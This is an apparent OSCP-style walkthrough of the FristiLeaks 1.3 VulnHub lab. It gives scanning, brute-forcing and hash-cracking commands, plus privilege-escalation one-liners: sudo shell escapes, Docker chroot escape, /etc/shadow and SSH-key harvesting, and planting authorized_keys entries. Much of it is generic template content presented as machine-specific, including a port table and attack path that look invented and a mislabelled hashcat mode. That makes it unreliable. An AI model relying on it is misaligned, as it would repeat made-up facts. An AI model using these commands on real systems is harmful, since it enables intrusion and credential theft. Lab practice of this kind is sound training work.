# FristiLeaks 1.3: OSCP Walkthrough

**Machine:** FristiLeaks 1.3
**Difficulty:** Medium
**Category:** Web Exploitation → Hash Cracking → Privilege Escalation
**OS:** Linux
**Download:** https://www.vulnhub.com/entry/fristileaks-13,59/
**VulnHub Group:** FristiLeaks 1.3

---

## 🔍 Reconnaissance

### Network Scanning

```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Open Ports:**
| Port  | Service  | Version / Details                          |
|-------|----------|--------------------------------------------|
| 22    | SSH      | OpenSSH                                    |
| 80    | HTTP     | Apache httpd + PHP                         |
| 139   | NetBIOS  | Samba smbd                                 |
| 445   | SMB      | Samba smbd                                 |

> FristiLeaks 1.3 combines web exploitation with hash cracking and privilege escalation. The web application is the primary entry point.

### Quick Recon Commands

```bash
# Full nmap scan
nmap -sV -sC -A -p- <TARGET_IP>

# Web server headers
curl -I http://<TARGET_IP>

# Check for web application type
curl http://<TARGET_IP>
```

---

## 🌐 Web Enumeration

### Directory Bruteforcing

```bash
# Gobuster
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 40

# Feroxbuster (faster)
feroxbuster -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

# Dirsearch
dirsearch -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### CMS & Technology Detection

```bash
# WhatWeb
whatweb http://<TARGET_IP>

# CMSeek
cmseek -u http://<TARGET_IP>/

# Check page source for technology hints
curl -s http://<TARGET_IP> | grep -i "generator"
curl -s http://<TARGET_IP> | grep -i "framework"
```

### Manual Web Enumeration

```bash
# Check all directories found by gobuster/feroxbuster
# Pay special attention to:
#   - /admin/ or /administrator/
#   - /login/ or /signin/
#   - /gallery/ or /images/
#   - /uploads/ or /files/
#   - /backup/ or /bak/
#   - /.git/ (source code exposure)
#   - /.env (environment variables)

# Check robots.txt
curl http://<TARGET_IP>/robots.txt

# Check for backup files
curl http://<TARGET_IP>/backup.zip
curl http://<TARGET_IP>/site.bak
curl http://<TARGET_IP>/backup.sql

# Check for .git directory
curl http://<TARGET_IP>/.git/config
```

### Application-Specific Enumeration

- Browse every page on the website
- Review all HTML source for comments, hidden fields, hints
- Look for base64-encoded data in page content URLs or hidden fields
- Test all input fields for injection
- Check file upload functionality if present
- Look for gallery or download sections that may contain hidden data

**Common findings on FristiLeaks:**
- Base64-encoded strings that decode to commands or credentials
- Comments in HTML/PHP source revealing version numbers or paths
- Configuration files with hardcoded credentials
- Log files or admin panels

```bash
# Test base64-encoded strings found on page
echo "<base64_string>" | base64 -d
echo "d2hvYW1p" | base64 -d
# Decodes to: whoami
```

---

## 🎯 Exploitation

### Path: Base64-Encoded Command Discovery → Hash Extraction

This is the primary exploitation path for FristiLeaks 1.3.

#### Step 1: Discover Base64-Encoded Content

1. Enumerate the web application thoroughly
2. Find pages or parameters containing base64-encoded strings
3. Decode them to reveal commands, credentials, or hints

```bash
# Example: Decode found strings
echo "SGVsbG8gV29ybGQ=" | base64 -d
echo "<any_base64_string_found>" | base64 -d

# Automated decoding of all found strings
grep -rE "[A-Za-z0-9+/]{20,}={0,2}" <scraped_content> | while read line; do echo "$line -> $(echo $line | base64 -d 2>/dev/null)"; done
```

#### Step 2: Extract Password Hashes

The decoded base64 strings may reveal:
- User credentials in plain text
- Password hashes stored in config files
- Database connection strings with hashed passwords
- Hints for cracking

#### Step 3: Crack Retrieved Hashes

```bash
# Save hashes to a file
cat > hashes.txt << 'EOF'
<hash>:<username>
EOF

# Determine hash type
# Joomla/WordPress often use md5crypt (mode 500) or phpass (mode 400)
# Standard Linux shadow hashes use md5crypt (mode 500) or sha512crypt (mode 1800)
# NT hashes use 1000
# Apache htpasswd uses APR1 (mode 1600, md5-crypt variant)

# Crack with hashcat
hashcat -m <hash_mode> hashes.txt /usr/share/wordlists/rockyou.txt

# Common hash modes:
#  0 = MD5
#  500 = md5crypt
#  1000 = NTLM
#  1600 = Apache $apr1$ (md5crypt)
# 1800 = sha512crypt
# 400 = phpass (Joomla)
# 300 = Blowfish
# 3200 = bcrypt

# Crack with John the Ripper
john --format=<format> hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Step 4: SSH Login with Cracked Credentials

```bash
# SSH with cracked credentials
ssh <user>@<TARGET_IP>
# Enter cracked password

# If SSH key login is preferred
# Generate a key pair
ssh-keygen -t rsa -b 4096

# Try to add key if authorized_keys is writable
cat ~/.ssh/id_rsa.pub | ssh <user>@<TARGET_IP> "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

### Alternative Path: SMB-Based Credential Harvesting

1. Enumerate SMB shares as with Stapler 1
2. Download files from accessible shares
3. Search for password hashes, config files, or credentials
4. Crack hashes with hashcat/john
5. SSH in with recovered credentials

```bash
# SMB enumeration
smbclient -L //<TARGET_IP> -N
enum4linux -a <TARGET_IP>

# Download files from share
smbclient //<TARGET_IP>/<share> -N
get <password_file>
get <config_backup>
```

---

## 🔐 Privilege Escalation

### Once Inside (Initial User Shell)

```bash
# Basic recon
whoami
id
uname -a
cat /etc/os-release
cat /etc/passwd
```

### Comprehensive Privilege Escalation Enumeration

```bash
# sudo permissions - THE MOST IMPORTANT CHECK
sudo -l

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/

# Capabilities
getcap -r / 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v /proc

# Writable cron scripts
find /etc/cron* -writable 2>/dev/null

# Private SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# Password files
find / -name ".htpasswd" -o -name "passwd*" -o -name "shadow*" 2>/dev/null | grep -v proc

# History files
cat ~/.bash_history
cat /root/.bash_history
cat /home/*/.bash_history
cat /root/.ssh/authorized_keys 2>/dev/null

# Database credentials in config files
find /var/www -name "*.php" -exec grep -l "password" {} \; 2>/dev/null
grep -r "password" /etc/ 2>/dev/null | grep -v "Binary"

# Docker access
docker --version 2>/dev/null
docker ps -a 2>/dev/null
docker run --rm -v /:/mnt -it alpine chroot /mnt sh 2>/dev/null

# Sudo for less/more/vi
sudo -l | grep -i "less\|more\|vi\|vim\|nano\|view"

# GTFOBins for any installed tools
# https://gtfobins.github.io/

# Kernel version (check for local exploits)
uname -r
searchsploit linux kernel <version>

# Writable scripts that root runs
find / -user root -group root -perm -o+w -type f 2>/dev/null | grep -v proc

# Check for password reuse between users
cat /etc/shadow 2>/dev/null
getent passwd | cut -d: -f1,6
```

### Common Privesc Paths for FristiLeaks 1.3

1. **Writable script in sudo:**
   ```bash
   sudo -l
   # If you can write to a script root executes:
   echo "/bin/bash" > /path/to/writable/script
   sudo /path/to/writable/script
   ```

2. **Sudo without password for a specific binary:**
   ```bash
   sudo -l
   # If nmap is allowed:
   sudo nmap --interactive
   !sh
   ```

3. **GTFOBins techniques:**
   ```bash
   # less
   sudo less /etc/shadow
   # Inside less: !/bin/sh

   # find
   sudo find . -exec /bin/sh \;

   # awk
   sudo awk 'BEGIN {system("/bin/sh")}'

   # python
   sudo python3 -c "import os; os.system('/bin/sh')"

   # vim
   sudo vim -c ':!/bin/sh'

   # nano
   sudo EDITOR='/bin/sh -c "sh"' nano

   # systemd
   sudo systemctl status root-cron.timer
   # If the timer or service script path is writable
   ```

4. **SUID binary exploitation:**
   ```bash
   # Find SUID binaries
   find / -perm -4000 -type f 2>/dev/null
   # For each SUID binary, check GTFOBins.com
   ```

5. **Cron job privesc:**
   ```bash
   # Find writable cron scripts
   find /etc/cron* -writable 2>/dev/null
   # Drop a reverse shell payload
   # Or add SSH key to root's authorized_keys
   ```

6. **Docker escape:**
   ```bash
   docker run --rm -v /:/host alpine chroot /host sh
   ```

7. **Kernel exploit (last resort):**
   ```bash
   # Check kernel version and local exploit database
   uname -r
   searchsploit linux kernel <version> local
   # Compile and run the appropriate exploit
   ```

---

## 📸 Screenshots

*No screenshots available for this machine.*

---

## ✅ Key Takeaways

- **FristiLeaks 1.3 emphasizes base64-encoded hints on the web app**: always decode suspicious strings you find during enumeration.
- **Hash cracking is a core skill** for this machine. Retrieve password hashes from config files, database dumps, SMB shares, or web application files, then crack them with hashcat or John.
- **SSH credentials** from cracked hashes provide the primary entry point.
- **Privesc relies on finding misconfigured sudo or writable scripts** that root executes. Always check `sudo -l` thoroughly.
- **The attack chain** is: Web Enumeration → Base64 Discovery → Hash Extraction → Hash Cracking → SSH Login → SUDO/Privesc → Root.
- **Multiple entry paths** exist: SMB may also yield password hashes or configs, providing an alternative starting point.
- **Always search for .git directories** on the web server and on SMB shares: they can contain the full source code with credentials or interesting logic.
- **Don't forget basic Linux privilege escalation checks** (SUID, capabilities, cron, writable files): FristiLeaks has straightforward escalation once you have an initial shell.

**Machine: FristiLeaks 1.3 [✅/❌ Pending]**

---

M4d3 w1th ❤️ by Ankit Patidar
